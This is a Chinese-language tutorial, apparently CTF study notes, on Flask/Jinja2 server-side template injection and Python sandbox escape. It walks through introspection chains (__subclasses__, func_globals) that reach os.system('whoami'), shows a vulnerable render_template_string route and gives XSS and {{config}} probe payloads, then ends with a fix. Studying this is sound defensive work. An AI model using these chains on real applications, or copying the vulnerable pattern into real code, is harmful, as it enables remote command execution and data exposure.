# ssti-sandbox-bypass
bytes2021 wait for it‘s wp

python-Flask模版注入攻击SSTI(python沙盒逃逸)
-

flask使用：

```python
from flask import Flask

app = Flask(__name__)

@app.route('/admin')
def helloworld():
   return "hack for fun"

if __name__ == '__main__':
   app.run()
```
模板渲染引擎jinjia2中的变量：

控制结构 {% %}

变量取值 {{ }}

注释 {# #}

jinja2模板中使用 {{ }} 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等

inja2中的过滤器可以理解为是jinja2里面的内置函数和字符串处理函数。

被两个括号包裹的内容会输出其表达式的值

ssti中我们需要关注的渲染方法和模板
-
flask的渲染方法有render_template和render_template_string两种

render_template()用来渲染指定的文件:

return render_template('index.html')

render_template_string则是用来渲染字符串

html = '<h1>This is a String</h1>'

return render_template_string(html)

模板

flask使用Jinja2来作为渲染引擎的

在网站的根目录下新建templates文件夹，这里是用来存放html文件。也就是模板文件。

![](https://img2018.cnblogs.com/blog/1545399/201910/1545399-20191011203939546-600271618.png)

qing.html:

![](https://img2018.cnblogs.com/blog/1545399/201910/1545399-20191011204008068-1274656139.png)

访问localhost/qing 后flask会渲染出模版:

![](https://img2018.cnblogs.com/blog/1545399/201910/1545399-20191011204058614-56274957.png)

而在我们SSTI注入场景中模版都是有变量进行渲染的。

例如我这里渲染方法进行传参 模版进行动态的渲染

![](https://img2018.cnblogs.com/blog/1545399/201910/1545399-20191011204058614-56274957.png)

```python
from flask import Flask,url_for,redirect,render_template,render_template_string

app = Flask(__name__)

@app.route('/qing')
def hello_world():
    return render_template('qing.html',string="qing qing qing")

if __name__ == '__main__':
    app.run()

```

qing.html：

```python

复制代码
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Flask</title>
</head>
<body>
<h1>{{string}}</h1>
</body>
</html>

```

![](https://img2018.cnblogs.com/blog/1545399/201910/1545399-20191011204512073-660172296.png)

python沙盒逃逸
-

这次的字节跳动比赛出了一道沙盒逃逸的jfinal，一开始以为进去后是文件上传结果，后来提示沙盒逃逸

沙箱：

沙箱是一种按照安全策略限制程序行为的执行环境。早期主要用于测试可疑软件等，比如黑客们为了试用某种病毒或者不安全产品，往往可以将它们在沙箱环境中运行。
　　经典的沙箱系统的实现途径一般是通过拦截系统调用，监视程序行为，然后依据用户定义的策略来控制和限制程序对计算机资源的使用，比如改写注册表，读写磁盘等。

沙箱逃逸,就是在给我们的一个代码执行环境下(Oj或使用socat生成的交互式终端),脱离种种过滤和限制,最终成功拿到shell权限的过程。其实就是闯过重重黑名单，最终拿到系统命令执行权限的过程。

socat

概述

socat，是linux下的一个工具，其功能与有“瑞士军刀”之称的netcat类似，不过据说可以看做netcat的加强版。的确如此，它有一些netcat所不具备却又很有需求的功能，例如ssl连接这种。nc可能是因为比较久没有维护，确实显得有些陈旧了。

安装

Ubuntu上可以直接sudo apt-get install socat，其他发行版没试过。

也可以去官网下载源码包socat link :http://www.dest-unreach.org/socat/

内建名称空间 builtins

在启动Python解释器之后，即使没有创建任何的变量或者函数，还是会有许多函数可以使用，这些函数就是内建函数，并不需要我们自己做定义，而是在启动python解释器的时候，就已经导入到内存中供我们使用，这个有文章里面有介绍，他有很多层的命名空间这个是刚开始自带最底层的那个。等我把我笔记都更上来就有了

​ 名称空间

它是从名称到对象的映射，而在python程序的执行过程中，至少会存在两个名称空间

内建名称空间

全局名称空间

还有介绍的就是python中的重要的魔术方法，这块很烦之前学的时候，我一度以为这些函数是flask里面特有的，导致我学的时候一脸懵逼，百度直接搜出来的那些前几名的都没说这个函数哪来的，就很淦

_class__ 返回类型所属的对象
 
__mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 

__base__ 返回该对象所继承的基类 // __base__和__mro__都是用来寻找基类的 

__subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表 

__init__ 类的初始化方法 

__globals__ 对包含函数全局变量的字典的引用

有这些类继承的方法，我们就可以从任何一个变量，顺藤摸瓜到基类中去，再获得到此基类所有实现的类，然后再通过实现类调用相应的成员变量函数 这里就是沙盒逃逸的基本流程了。ssti注入好像实战中应该见不到，都是ctf里面才会出的，应该是。

python中一切均为对象，均继承object对象

```python
''.__class__.__mro__[-1] 

>>>[].__class__.__bases__[0]
 
>>><type 'object'> 

>>>''.__class__.__mro__[-1] 

<type 'object'>
```

获取字符串的类对象

''.__class__

<type 'str'>

寻找基类

''.__class__.__mro__

(<type 'str'>, <type 'basestring'>, <type 'object'>)

查看实现类和成员

```python
''.__class__.__mro__[1].__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]
```
例如我要使用os模块执行命令

首先获取 warnings.catch_warnings 在 object 类中的位置

```python
import warnings
[].__class__.__base__.__subclasses__().index(warnings.catch_warnings)
60
[].__class__.__base__.__subclasses__()[60]
<class 'warnings.catch_warnings'>
[].__class__.__base__.__subclasses__()[60].__init__.func_globals.keys()
['filterwarnings', 'once_registry', 'WarningMessage', '_show_warning', 'filters', '_setoption', 'showwarning', '__all__', 'onceregistry', '__package__', 'simplefilter', 'default_action', '_getcategory', '__builtins__', 'catch_warnings', '__file__', 'warnpy3k', 'sys', '__name__', 'warn_explicit', 'types', 'warn', '_processoptions', 'defaultaction', '__doc__', 'linecache', '_OptionError', 'resetwarnings', 'formatwarning', '_getaction']

```
查看 linecache(操作文件的函数）

```python
`[].__class__.__base__.__subclasses__([60].__init__.func_globals['linecache'].__dict__.keys()`
`['updatecache', 'clearcache', '__all__', '__builtins__', '__file__', 'cache', 'checkcache', 'getline', '__package__', 'sys', 'getlines', '__name__', 'os', '__doc__']`
 
```
可以看到这里调用了 os 模块, 所以可以直接调用 os 模块

```python
a=[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12]

a
<module 'os' from '*****\python27\lib\os.pyc'>

```

接着要调用 os 的 system 方法, 先查看 system 的位置:

```python
a.__dict__.keys().index('system')
79
a.__dict__.keys()[79]
'system'
b=a.__dict__.values()[79]
b
<built-in function system>
b('whoami')
```
python模板注入ssti

![](https://img2018.cnblogs.com/blog/1545399/201910/1545399-20191013164020897-352800982.png)

```python
code = request.args.get('ssti')
    html = '''
        <h1>qing -SSIT</h1>
        <h2>The ssti is </h2>
            <h3>%s</h3>
        ''' % (code)
    return render_template_string(html)
```

这里把ssti变量动态的输出在%s,然后进过render_template_string渲染模版，单独ssti注入成因就在这里。

这里前端输出了 XSS问题肯定是存在的

http://127.0.0.1:5000/qing?ssti=%3Cscript%3Ealert(/qing/)%3C/script%3E

![](https://img2018.cnblogs.com/blog/1545399/201910/1545399-20191013165116630-1626199707.png)

继续SSTI注入  前面说了Jinja2变量解析

控制结构 {% %}

变量取值 {{ }}

注释 {# #}

我们这里进行变量测试

http://127.0.0.1:5000/qing?ssti={{2*2}}

![](https://img2018.cnblogs.com/blog/1545399/201910/1545399-20191013170013103-1452841122.png)

 flask中也有一些全局变量
 
 http://127.0.0.1:5000/qing?ssti={{config}}
 
 ![](https://img2018.cnblogs.com/blog/1545399/201910/1545399-20191013214137250-1253873228.png)
 
 防止SSTI注入的最简单方法
 ```python
 code = request.args.get('ssti')
    html = '''
        <h1>qing -SSIT</h1>
        <h2>The ssti is </h2>
            <h3>{{code}}</h3>
        ''' 
    return render_template_string(html)
```
 将template 中的 ”’<h3> %s!</h3>”’ % code更改为 ”’<h3>{{code}}</h3>”’ ，这样以来，Jinja2在模板渲染的时候将request.url的值替换掉{{code}}, 而不会对code内容进行二次渲染

这样即使code中含有{{}}也不会进行渲染，而只是把它当做普通字符串

